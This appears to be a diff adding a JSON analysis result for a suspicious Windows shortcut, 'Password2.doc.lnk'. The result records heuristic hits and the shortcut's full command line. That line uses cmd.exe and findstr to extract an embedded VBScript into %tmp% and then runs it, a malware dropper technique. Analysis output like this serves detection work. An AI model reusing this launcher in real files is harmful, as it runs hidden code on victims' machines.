@@ -1,0 +1,23 @@
+{
+    "response": {
+        "supplementary": [],
+        "extracted": []
+    },
+    "result": {
+        "heuristics": [
+            1,
+            4
+        ],
+        "tags": {
+            "file.name.extracted": [
+                "cmd.exe"
+            ],
+            "file.shortcut.icon_location": [
+                "shell32.dll"
+            ],
+            "file.shortcut.command_line": [
+                "..\\..\\Windows\\system32\\cmd.exe /v:on /c findstr \"rSIPPswjwCtKoZy.*\" Password2.doc.lnk > \"%tmp%\\VEuIqlISMa.vbs\" & \"%tmp%\\VEuIqlISMa.vbs\""
+            ]
+        }
+    }
+}
